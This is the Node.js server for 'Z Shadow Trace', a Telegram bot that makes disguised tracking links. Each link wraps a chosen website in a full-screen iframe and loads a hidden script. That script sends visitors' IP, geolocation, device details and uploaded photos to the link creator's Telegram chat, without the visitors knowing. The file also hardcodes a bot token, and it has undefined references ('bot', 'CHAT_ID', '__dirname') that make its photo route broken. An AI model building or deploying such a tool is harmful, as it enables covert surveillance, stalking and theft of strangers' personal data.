import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import TelegramBot from "node-telegram-bot-api";

const app = express();

app.use(express.json());
app.use(express.static("public"));

const BOT_TOKEN = "8713034123:AAFDS_eXZ4MsqhJGnSLCMRq8UVGaK_84nV4";

const ADMIN_ID = 8111461057;

function isAdmin(id) {
  return id === ADMIN_ID;
}

const DB_FILE = "./database.json";

// LOAD DB
function loadDB() {

  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, "{}");
  }

  return JSON.parse(
    fs.readFileSync(DB_FILE)
  );

}

// SAVE DB
function saveDB(data) {

  fs.writeFileSync(
    DB_FILE,
    JSON.stringify(data, null, 2)
  );

}

// RANDOM TRACKING ID
function generateId() {

  return Math.random()
    .toString(36)
    .substring(2, 8);

}

// HOME
app.get("/", (req, res) => {

  res.send("Bot Running 🚀");

});

// TRACKING ROUTE
app.get("/t/:id", (req, res) => {

  const trackingId = req.params.id;

  const db = loadDB();

  const entry = db[trackingId];

  if (!entry) {
    return res.send("Invalid Tracking ID");
  }

  res.send(`
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width, initial-scale=1.0">

<title>Loading...</title>

<style>

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

iframe {
  width: 100%;
  height: 100%;
  border: none;
}

</style>

</head>

<body>

<iframe src="${entry.targetUrl}"></iframe>

<script
  data-tracking-id="${trackingId}"
  data-server-url="https://analytics-bot-1-3j2c.onrender.com"
  src="/script.js">
</script>

</body>
</html>
`);

});

// ANALYTICS ROUTE
app.post("/data", async (req, res) => {

  const { trackingId, pretty } = req.body;

  const db = loadDB();

  const entry = db[trackingId];

  if (!entry) {
    return res.sendStatus(404);
  }

  const ownerChatId = entry.owner;

  try {

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: ownerChatId,
          text: pretty || "No analytics data"

        })

      }
    );

  } catch (e) {

    console.log(e);

  }

  res.sendStatus(200);

});

// ===== PHOTO ROUTE =====
app.post('/photo', async (req, res) => {
  try {
    const { imageData } = req.body;

    if (!imageData) {
      return res.status(400).json({
        success: false,
        message: 'No image received'
      });
    }

    // remove base64 header
    const base64Data = imageData.replace(
      /^data:image\/jpeg;base64,/,
      ''
    );

    // temp file
    const fileName = `photo_${Date.now()}.jpg`;
    const filePath = path.join(__dirname, fileName);

    // save image
    fs.writeFileSync(filePath, base64Data, 'base64');

    // send to telegram
    await bot.sendPhoto(CHAT_ID, filePath, {
      caption: '📸 New Photo Received'
    });

    // delete temp file
    fs.unlinkSync(filePath);

    res.json({
      success: true
    });

  } catch (err) {
    console.log(err);

    res.status(500).json({
      success: false,
      error: 'Server Error'
    });
}
});

// TELEGRAM WEBHOOK
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {

  const msg = req.body.message;

  if (!msg) {
    return res.sendStatus(200);
  }

  const chatId = msg.chat.id;
  const text = msg.text || "";

  const db = loadDB();

  // SAVE USER
  if (!db.users) db.users = {};

  db.users[chatId] = {

    id: chatId,
    name: msg.from.first_name || "N/A",
    username: msg.from.username || "N/A",
    last_seen: new Date().toLocaleString()

  };

  saveDB(db);

  // START
  if (text === "/start") {

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,

          text:
`👋 Hello ${msg.from.first_name || ""} ${msg.from.last_name || ""}

╔═════════════════════════╗
       🖥️ 𝚉 𝚂𝙷𝙰𝙳𝙾𝚆 𝚃𝚁𝙰𝙲𝙴 🖥️
╚═════════════════════════╝

⚡ Welcome to the ultimate tracking system

✨ Features:
🔗 Create Tracking Links
📡 Live Visitor Analytics
🌍 IP & GEO Information
📱 Device Information
⚡ Fast & Secure Tracking

📌 Available Commands

/create ➜ Create Tracking Link

⚡ Powered By ZShadow`

        })

      }
    );

  }

  // CREATE
  else if (text === "/create") {

    db[chatId] = {
      waitingForUrl: true
    };

    saveDB(db);

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,
          text: "🌐 Send Website URL"

        })

      }
    );

  }

  // USER LIST
  else if (text === "/userlist") {

    if (!isAdmin(chatId)) {

      return fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({

            chat_id: chatId,
            text: "❌ Access Denied"

          })

        }
      );

    }

    const users = db.users || {};
    const ids = Object.keys(users);

    let msgText =
`👥 TOTAL USERS: ${ids.length}

`;

    ids.reverse().forEach((id, i) => {

      const u = users[id];

      msgText += `
${i + 1}.
👤 Name     : ${u.name}
🔗 Username : ${u.username}
🆔 ID       : ${u.id}
🕒 Last Seen: ${u.last_seen}

`;

    });

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,
          text: msgText

        })

      }
    );

  }

  // BROADCAST
  else if (text.startsWith("/broadcast")) {

    if (!isAdmin(chatId)) {

      return fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({

            chat_id: chatId,
            text: "❌ Access Denied"

          })

        }
      );

    }

    const broadcastMsg = text
      .replace("/broadcast", "")
      .trim();

    if (!broadcastMsg) {

      return fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({

            chat_id: chatId,

            text:
`⚠ Usage:

/broadcast Your Message`

          })

        }
      );

    }

    const users = db.users || {};

    let success = 0;
    let failed = 0;

    for (const id of Object.keys(users)) {

      try {

        await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {

            method: "POST",

            headers: {
              "Content-Type": "application/json"
            },

            body: JSON.stringify({

              chat_id: id,

              text:
`📢 BROADCAST MESSAGE BY ADMIN

${broadcastMsg}

⚡ Powered By ZShadow`

            })

          }
        );

        success++;

      } catch {

        failed++;

      }

    }

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,

          text:
`✅ Broadcast Completed

📨 Sent   : ${success}
❌ Failed : ${failed}`

        })

      }
    );

  }

// STATS
else if (text === "/stats") {

  if (!isAdmin(chatId)) {

    return fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,
          text: "❌ Access Denied"

        })

      }
    );

  }

  const users = db.users || {};

  const totalUsers =
    Object.keys(users).length;

  const totalLinks =
    Object.keys(db).filter(
      key =>
        db[key]?.targetUrl
    ).length;

  const statsText =
`📊 Z SHADOW TRACE STATS

👥 Total Users   : ${totalUsers}
🔗 Total Links   : ${totalLinks}

⚡ Powered By ZShadow`;

  await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {

      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({

        chat_id: chatId,
        text: statsText

      })

    }
  );

}

  // URL INPUT
  else if (db[chatId]?.waitingForUrl) {

    const trackingId = generateId();

    db[trackingId] = {

      owner: chatId,
      targetUrl: text

    };

    db[chatId].waitingForUrl = false;

    saveDB(db);

    const trackingLink =
`https://analytics-bot-1-3j2c.onrender.com/t/${trackingId}`;

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,

          text:
`✅ Tracking Link Created

🔗 ${trackingLink}`

        })

      }
    );

  }

  res.sendStatus(200);

});

// PING
app.get("/ping", (req, res) => {

  res.send("OK");

});

// START SERVER
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

  console.log("Server Running 🚀");

});